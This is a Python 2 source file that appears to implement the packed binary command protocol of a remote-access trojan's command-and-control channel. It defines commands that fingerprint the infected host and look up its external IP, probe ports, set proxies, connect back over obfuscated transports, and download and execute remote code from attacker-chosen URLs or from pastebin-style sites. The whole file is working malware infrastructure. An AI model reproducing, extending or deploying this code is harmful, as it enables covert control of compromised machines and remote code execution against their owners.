# -*- coding: utf-8 -*-

import struct
import netaddr
import re
import base64
import baseconv
import binascii
import time
import datetime
import platform
import uuid
import urllib2
import urlparse
import StringIO
import socket
import psutil
import os

def from_bytes(bytes):
    return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))

def to_bytes(value, size=0):
    value = long(value)
    bytes = []
    while value:
        bytes.append(chr(value % 256))
        value = value >> 8
    bytes = ''.join(bytes)
    bytes += '\x00'*(size-len(bytes))
    return bytes

class Command(object):
    session_required = False
    internet_required = False

    def pack(self):
        return b''

    @staticmethod
    def unpack(data):
        return Command(), 0

class Poll(Command):
    @staticmethod
    def unpack(data):
        return Poll(), 0

    def __repr__(self):
        return '{POLL}'

class SystemStatus(Command):
    @staticmethod
    def unpack(data):
        return SystemStatus(*struct.unpack_from('BBBBBB', data)), 6

    def __init__(self, cpu=None, users=None, mem=None, listen=None, remote=None, idle=None):
        if cpu is None:
            try:
                self.cpu = int(psutil.cpu_percent())
            except:
                self.cpu = 0
        else:
            self.cpu = int(cpu)

        if users is None:
            try:
                self.users = len(set([ x.name for x in psutil.users()]))
            except:
                self.users = 0
        else:
            self.users = int(users)

        if self.users > 255:
            self.users = 255

        if mem is None:
            try:
                self.mem = int(psutil.virtual_memory().percent)
            except:
                self.mem = 0
        else:
            self.mem = int(mem)

        if listen is None:
            try:
                self.listen = len(set([
                    x.laddr[1] for x in psutil.net_connections() if x.status=='LISTEN'
                ]))
            except:
                self.listen = 0
        else:
            self.listen = int(listen)

        if self.listen > 255:
            self.listen = 255

        if remote is None:
            try:
                self.remote = len(set([
                    x.raddr for x in psutil.net_connections() \
                    if x.status=='ESTABLISHED' and x.raddr[0] not in (
                        '127.0.0.1', '::ffff:127.0.0.1'
                    )
                ]))

            except Exception, e:
                self.remote = 0
        else:
            self.remote = int(remote)

        if self.remote > 255:
            self.remote = 255

        if idle is None:
            try:
                self.idle = min(
                    time.time() - os.stat(
                        '/dev/{}'.format(x.terminal)
                    ).st_atime for x in psutil.users() if x.terminal
                ) > 60*10
            except:
                self.idle = True
        else:
            self.idle = bool(idle)

    def get_dict(self):
        return {
            'cpu': self.cpu,
            'mem': self.mem,
            'listen': self.listen,
            'remote': self.remote,
            'users': self.users,
            'idle': self.idle
        }

    def pack(self):
        return struct.pack(
            'BBBBBB',
            self.cpu, self.users, self.mem,
            self.listen, self.remote, self.idle
        )

    def __repr__(self):
        return ('{{SS: CPU:{cpu}% MEM:{mem}% L:{listen} ' + \
                    'E:{remote} U:{users} I:{idle}}}').format(**self.get_dict())


class Ack(Command):
    def __init__(self, amount=0):
        self.amount = amount

    def pack(self):
        return chr(self.amount)

    @staticmethod
    def unpack(data):
        return Ack(amount=ord(data[0])), 1

    def __repr__(self):
        return '{{ACK ({})}}'.format(self.amount)


class Idle(Command):
    @staticmethod
    def unpack(data):
        return Idle(), 0

    def __repr__(self):
        return '{IDLE}'

class Sleep(Command):
    @staticmethod
    def unpack(data):
        return Sleep(
            struct.unpack_from('<H', data)[0]
        ), struct.calcsize('<H')

    def pack(self):
        return struct.pack('<H', self.timeout)

    def __init__(self, timeout=30):
        self.timeout = int(timeout)

    def __repr__(self):
        return '{{SLEEP: {}}}'.format(self.timeout)

class CheckConnect(Command):
    @staticmethod
    def unpack(data):
        host, port_start, port_end = struct.unpack_from('IHH', data)
        return CheckConnect(
            host, port_start, port_end
        ), struct.calcsize('IHH')

    def __init__(self, host, port_start, port_end=None):
        self.host = netaddr.IPAddress(host)
        self.port_start = port_start
        self.port_end = None if port_end == 0 else port_end

    def pack(self):
        return struct.pack(
            'IHH',
            int(self.host), int(self.port_start), int(self.port_end)
        )

    def __repr__(self):
        return '{{CHECK: {}:{}-{}}}'.format(
            self.host, self.port_start, self.port_end)

class Reexec(Command):
    @staticmethod
    def unpack(data):
        return Reexec(), 0

    def __repr__(self):
        return '{REEXEC}'

class Exit(Command):
    @staticmethod
    def unpack(data):
        return Exit(), 0

    def __repr__(self):
        return '{EXIT}'

class Disconnect(Command):
    @staticmethod
    def unpack(data):
        return Disconnect(), 0

    def __repr__(self):
        return '{DISCONNECT}'

class Policy(Command):
    def __init__(self, poll, kex, timestamp=None):
        self.timestamp = timestamp or time.time()
        self.poll = poll
        self.kex = kex

    def pack(self):
        field = (int(bool(self.kex)) << 31) | (self.poll & ((1<<30)-1))
        return struct.pack('>II', field, self.timestamp)

    def __repr__(self):
        return '{{POLICY: POLL={} TIME={} KEX={}}}'.format(self.poll, self.timestamp, self.kex)

    @staticmethod
    def unpack(data):
        field, timestamp = struct.unpack_from('>II', data)
        kex = (field >> 31) & 1
        poll = field & ((1<<30)-1)
        return Policy(poll, kex, timestamp), 8

class Kex(Command):
    def __init__(self, parcel):
        self.parcel = parcel

    def pack(self):
        return struct.pack('B',len(self.parcel)) + self.parcel

    def __repr__(self):
        return '{{KEX: Q={}, SPI={:08x}}}'.format(binascii.b2a_hex(self.parcel), self.spi)

    @property
    def spi(self):
        return struct.unpack('>I', self.parcel[0:4])[0]

    @staticmethod
    def unpack(data):
        length = struct.unpack_from('B', data)[0]
        return Kex(data[1:1+length]), 1+length

class SystemInfo(Command):
    session_required = True

    # To do, add more? Who knows how platform.uname looks like on other platforms?
    # How many are there? Let's use 3 bits for that - 8 systems in total
    well_known_os_names_decode = dict(enumerate([
        'Linux', 'Windows', 'SunOS', 'android'
    ]))
    well_known_os_names_encode = {
        v:k for k,v in well_known_os_names_decode.iteritems()
    }
    # Same question.
    well_known_cpu_archs_decode = dict(enumerate([
        'x86', 'x86', 'x64', 'x64', 'arm'
    ]))
    well_known_cpu_archs_encode = {
        v:k for k,v in well_known_cpu_archs_decode.iteritems()
    }

    well_known_machines_equality = {
        'i386': 'x86',
        'i486': 'x86',
        'i586': 'x86',
        'i686': 'x86',
        'x86_64': 'x64',
        'amd64': 'x64',
        'i86pc': 'x86',
        'armv7l': 'arm',
        'armv8l': 'arm',
    }

    def __init__(
            self, system=None, arch=None,
            node=None, external_ip=None,
            internet=False, boottime=None
        ):
        self.system = system or platform.system()
        self.arch = arch or platform.machine().lower()
        self.arch = self.well_known_machines_equality.get(self.arch, self.arch)

        self.node = node or uuid.getnode()
        try:
            self.boottime = boottime or datetime.datetime.fromtimestamp(
                psutil.boot_time()
            )
        except:
            self.boottime = datetime.datetime.fromtimestamp(0)

        self.internet = bool(internet)
        self.external_ip = external_ip
        if external_ip is not None:
            if external_ip in ['0.0.0.0', u'0.0.0.0', 0, netaddr.IPAddress('0.0.0.0')]:
                self.external_ip = None
            else:
                self.external_ip = netaddr.IPAddress(external_ip)
        else:
            try:
                proxy = urllib2.ProxyHandler()
                opener = urllib2.build_opener(proxy)
                opener.addheaders = [('User-agent', 'curl/7.50.0')]
                response = opener.open('http://ifconfig.co', timeout=5)
                if response.code == 200:
                    self.external_ip = netaddr.IPAddress(response.read().strip())
                    self.internet = True
            except Exception, e:
                self.external_ip = None
                self.internet = False


    def pack(self):
        # 3 bits for system, 3 bits for arch, 1 bit for internet
        osid = self.well_known_os_names_encode[self.system]
        archid = self.well_known_cpu_archs_encode[self.arch]
        block = osid << 4 | archid << 1 | int(bool(self.internet))
        boottime = int(time.mktime(self.boottime.timetuple()))
        return struct.pack('B', block) + to_bytes(self.node, 6) + \
          struct.pack('>II', int(self.external_ip or 0), boottime)

    def get_dict(self):
        return {
            'os': self.system,
            'arch': self.arch,
            'node': self.node,
            'external_ip': self.external_ip,
            'internet': self.internet,
            'boottime': self.boottime
        }

    def __repr__(self):
        return '{{SYS: OS={} ARCH={} NODE={:12x} IP={} INTERNET={} BOOT={}}}'.format(
            self.system, self.arch, self.node, self.external_ip, self.internet, self.boottime.ctime()
        )

    @staticmethod
    def unpack(data):
        block, node, rest = data[:1], data[1:1+6], data[1+6:1+6+8]
        block = ord(block)
        osid = (block >> 4) & 7
        archid = (block >> 1) & 7
        internet = bool(block & 1)
        node = from_bytes(node)

        ip = 0
        boottime = 0

        try:
            ip, boottime = struct.unpack('>II', rest)

            try:
                boottime = datetime.datetime.fromtimestamp(boottime)
            except:
                pass

            try:
                ip = netaddr.IPAddress(ip)
            except:
                pass

        except:
            pass

        return SystemInfo(
            system=SystemInfo.well_known_os_names_decode[osid],
            node=node,
            arch=SystemInfo.well_known_cpu_archs_decode[archid],
            internet=internet,
            external_ip=ip,
            boottime=boottime
        ), 1+6+8

class SetProxy(Command):
    well_known_proxy_schemes_decode = dict(enumerate([
        'none', 'socks4', 'socks5', 'http', 'any'
    ], 1))

    well_known_proxy_schemes_encode = {
        v:k for k,v in well_known_proxy_schemes_decode.iteritems()
    }

    def __init__(self, scheme, ip, port, user=None, password=None):
        if scheme == 'socks':
            scheme = 'socks5'

        self.scheme = scheme
        try:
            self.ip = netaddr.IPAddress(ip)
        except:
            self.ip = netaddr.IPAddress(
                socket.gethostbyname(ip)
            )

        self.port = int(port)
        self.user = user
        self.password = password

        if self.user and not self.password:
            self.password = ''

    def pack(self):
        scheme = chr(self.well_known_proxy_schemes_encode[self.scheme])
        ip = struct.pack('>I', int(self.ip))
        port = struct.pack('>H', int(self.port))
        user = self.user or ''
        password = self.password or ''
        user = chr(len(user))+user
        password = chr(len(password))+password
        return scheme + ip + port + user + password

    @staticmethod
    def unpack(data):
        sip = struct.calcsize('>BIH')
        scheme, ip, port = struct.unpack_from('>BIH', data)
        scheme = SetProxy.well_known_proxy_schemes_decode[scheme]
        ip = netaddr.IPAddress(ip)
        data = data[sip:]
        user_len = ord(data[0])
        user = data[1:1+user_len]
        data = data[1+user_len:]
        pass_len = ord(data[0])
        user = data[1:1+pass_len]
        password = data[1+pass_len:]
        return SetProxy(scheme, ip, port, user, password), sip+user_len+pass_len+2

    def __repr__(self):
        if self.scheme == 'none':
            return '{{PROXY: DISABLED}}'
        elif self.scheme == 'any':
            return '{{PROXY: ENABLED}}'

        if self.user and self.password:
            auth = '{}:{}@'.format(self.user, self.password)
        else:
            auth = ''

        return '{{PROXY: {}://{}{}:{}}}'.format(
            self.scheme, auth, self.ip, self.port
        )

class Connect(Command):
    well_known_transports_decode = dict(enumerate([
        'obfs3','udp_secure','http','tcp_cleartext','rsa',
        'ssl','udp_cleartext','scramblesuit','ssl_rsa', 'ec4'
    ], 1))

    well_known_transports_encode = {
        v:k for k,v in well_known_transports_decode.iteritems()
    }

    def __init__(self, ip, port, transport='ssl'):
        self.transport = transport
        try:
            self.ip = netaddr.IPAddress(ip)
        except:
            self.ip = netaddr.IPAddress(
                socket.gethostbyname(ip)
            )

        self.port = int(port)

    def pack(self):
        message = b''
        if self.transport in self.well_known_transports_encode:
            code = (1 << 7) | self.well_known_transports_encode[self.transport]
            message = message + struct.pack('B', code)
        else:
            if len(self.transport) > 24:
                raise ValueError('Transport name is too large')
            else:
                code = len(self.transport)
            message = message + struct.pack('B', code) + self.transport

        message = message + struct.pack('>I', int(self.ip))
        message = message + struct.pack('>H', int(self.port))

        return struct.pack('B', len(message)) + message

    def __repr__(self):
        return '{{CONNECT: TRANSPORT={} IP={} PORT={}}}'.format(
            self.transport, self.ip, self.port
        )

    @staticmethod
    def unpack(data):
        length = struct.unpack_from('B', data)[0]
        data = data[1:1+length]
        transport, rest = data[:1], data[1:]
        transport = struct.unpack('B', transport)[0]
        if transport & 1<<7:
            transport = Connect.well_known_transports_decode[transport & (1<<7)-1]
        else:
            transport, rest = rest[:transport], rest[transport:]

        host, port = rest[:4], rest[4:]
        host = str(netaddr.IPAddress(struct.unpack('>I', host)[0]))
        port = struct.unpack('>H', port)[0]

        return Connect(host, port, transport), 1+length

class DownloadExec(Command):
    # 2 bits - 3 max
    well_known_downloadexec_action_decode = dict(enumerate([
        'pyexec', 'exec', 'sh'
    ]))

    well_known_downloadexec_action_encode = {
        v:k for k,v in well_known_downloadexec_action_decode.iteritems()
    }

    # 3 bits - 7 max
    well_known_downloadexec_scheme_decode = dict(enumerate([
        'http', 'https', 'ftp', 'tcp'
    ]))

    well_known_downloadexec_scheme_encode = {
        v:k for k,v in well_known_downloadexec_scheme_decode.iteritems()
    }

    def __init__(self, url, action='pyexec', proxy=False):
        self.proxy = bool(proxy)
        self.url = url
        self.action = action
        if not self.url in ('http', 'https'):
            self.proxy = False

    def pack(self):
        try:
            action = self.well_known_downloadexec_action_encode[self.action]
        except:
            raise ValueError('Unknown action: {}'.format(self.action))

        url = urlparse.urlparse(self.url)

        try:
            addr = netaddr.IPAddress(url.hostname)
        except:
            addr = netaddr.IPAddress(socket.gethostbyname(url.hostname))

        if not addr.version == 4:
            raise ValueError('IPv6 unsupported')

        addr = int(addr)
        if url.port:
            port = int(url.port)
        else:
            port = 0

        path = url.path

        if len(path) > 16:
            raise ValueError('Too big url path')

        try:
            scheme = self.well_known_downloadexec_scheme_encode[
                url.scheme
            ]
        except:
            raise ValueError('Unknown scheme: {}'.format(url.scheme))

        code = (self.proxy << 5) | (action << 3) | scheme

        return struct.pack(
            'BIHB', code, addr, port, len(path)
        ) + path

    def __repr__(self):
        return '{{DEXEC: URL={} ACTION={} PROXY={}}}'.format(
            self.url, self.action, self.proxy
        )

    @staticmethod
    def unpack(data):
        bsize = struct.calcsize('BIHB')
        code, addr, port, plen = struct.unpack_from('BIHB', data)
        action = DownloadExec.well_known_downloadexec_action_decode[(code >> 3) & 3]
        scheme = DownloadExec.well_known_downloadexec_scheme_decode[code & 7]
        proxy = bool((code >> 5) & 1)
        host = str(netaddr.IPAddress(addr))
        port = ':{}'.format(port) if port else (
            '' if scheme in ('http', 'ftp', 'https') else 53
        )
        path = data[bsize:bsize+plen]
        return DownloadExec('{}://{}{}{}'.format(
            scheme, host, port, path
        ), action, proxy), bsize+plen

class PasteLink(Command):
    internet_required = True

    # 15 max - 4 bits
    well_known_paste_services = [(
        'http://pastebin.com/raw/{}',
        base64.b64decode,
        base64.b64encode,
    ), (
        'http://beta.pastee.com/api/get/{}/raw',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://ix.io/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://paste.ee/r/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'https://hastebin.com/raw/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://pastie.org/pastes/{}/download',
        lambda x: to_bytes(long(x)),
        lambda x: str(from_bytes(x)),
    ), (
        'http://dpaste.com/{}.txt',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://climbi.com/static/{}-0.txt',
        lambda x: to_bytes(long(x)),
        lambda x: str(from_bytes(x)),
    ), (
        'https://friendpaste.com/{}/raw',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    )]

    well_known_paste_services_encode = {
        k:i for i, k in enumerate(well_known_paste_services)
    }

    well_known_paste_services_decode = {
        i:k for k,i in well_known_paste_services_encode.iteritems()
    }

    # 4 max - 2 bits
    well_known_pastebin_action_decode = dict(enumerate([
        'pyexec', 'exec', 'sh'
    ]))

    well_known_pastebin_action_encode = {
        v:k for k,v in well_known_pastebin_action_decode.iteritems()
    }

    def __init__(self, url, action='pyexec'):
        self.url = url
        self.action = action

    def pack(self):
        message = b''

        well_known_found = False

        if not self.action in self.well_known_pastebin_action_encode:
            raise ValueError('User-defined actions are not supported')

        for (service, encode, decode), code in self.well_known_paste_services_encode.iteritems():
            match = re.match(service.format('(.*)'), self.url)
            if match:
                paste = encode(match.groups()[0])
                message = struct.pack(
                    'BB',
                    (1<<7) | (self.well_known_pastebin_action_encode[self.action] << 5) | code,
                    len(paste)
                ) + paste
                well_known_found = True
                break

        if not well_known_found:
            if len(self.url) > 32:
                raise ValueError('Url size of user-defined urls limited to 25 bytes')

            message = struct.pack(
                'B',
                self.well_known_pastebin_action_encode[self.action] << 5 | len(self.url)
            ) + self.url

        return message

    def __repr__(self):
        return '{{PASTE: URL={} ACTION={} }}'.format(
            self.url, self.action
        )

    @staticmethod
    def unpack(data):
        h1 = struct.unpack_from('B', data)[0]
        if h1 & (1<<7):
            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
            urltpl, encode, decode = PasteLink.well_known_paste_services_decode[h1 & 7]
            _, length = struct.unpack_from('BB', data)
            url = urltpl.format(decode(data[2:2+length]))
            return PasteLink(url, action), 2+length
        else:
            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
            length = h1 & 31
            return PasteLink(data[1:length+1], action), 1+length


class Error(Command):
    errors = [
        'NO_ERROR',
        'NO_SESSION',
        'NO_COMMAND',
        'NO_POLICY',
        'CRC_FAILED',
        'EXCEPTION'
    ]

    errors_decode = dict(enumerate(errors))
    errors_encode = {v:k for k,v in errors_decode.iteritems()}

    def __init__(self, error, message=''):
        self.error = error
        self.message = message

    def pack(self):
        if len(self.message) > 25:
            raise ValueError('Message too big')

        return struct.pack('B', self.errors_encode[self.error] << 5 | len(self.message))+self.message

    def __repr__(self):
        return '{{{}{}}}'.format(self.error, ': '+self.message if self.message else '')

    @staticmethod
    def unpack(data):
        header = ord(data[0])
        code = (header >> 5) & 7
        length = header & 31
        return Error(Error.errors_decode[code], data[1:1+length]), 1+length


class ParcelInvalidCrc(Exception):
    @property
    def error(self):
        return Error('CRC_FAILED')

class ParcelInvalidPayload(Exception):
    @property
    def error(self):
        return Error('CRC_FAILED')

class ParcelInvalidCommand(Exception):
    def __init__(self, command):
        self.command = command

    def __repr__(self):
        return 'Unknown command: {}'.format(command)

class Parcel(object):
    # Explicitly define commands. In other case make break something
    commands = [
        Poll, Ack, Policy, Idle, Kex,
        Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
        Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
        SetProxy
    ]

    commands_decode = dict(enumerate(commands))
    commands_encode = { v:k for k,v in commands_decode.iteritems() }

    def __init__(self, *commands):
        if not all((type(command) in self.commands) for command in commands):
            missing = [ command for command in commands if not type(command) in self.commands ]
            raise ParcelInvalidCommand(missing)

        self.commands = commands

    def __iter__(self):
        return iter(self.commands)

    def __len__(self):
        return len(self.commands)

    def pack(self):
        data = b''.join([
            chr(self.commands_encode[type(command)]) + command.pack() for command in self.commands
        ])
        crc = binascii.crc32(data)
        return struct.pack('>i', crc) + data

    def __repr__(self):
        return str(self.commands)

    @staticmethod
    def unpack(data):
        messages = []

        try:
            crc, data = struct.unpack_from('>i', data)[0], data[4:]
        except struct.error:
            raise ParcelInvalidPayload

        if not binascii.crc32(data) == crc:
            raise ParcelInvalidCrc

        while data:
            command, data = data[:1], data[1:]
            cmd, offt = Parcel.commands_decode[ord(command)].unpack(data)
            messages.append(cmd)
            data = data[offt:]

        return Parcel(*messages)
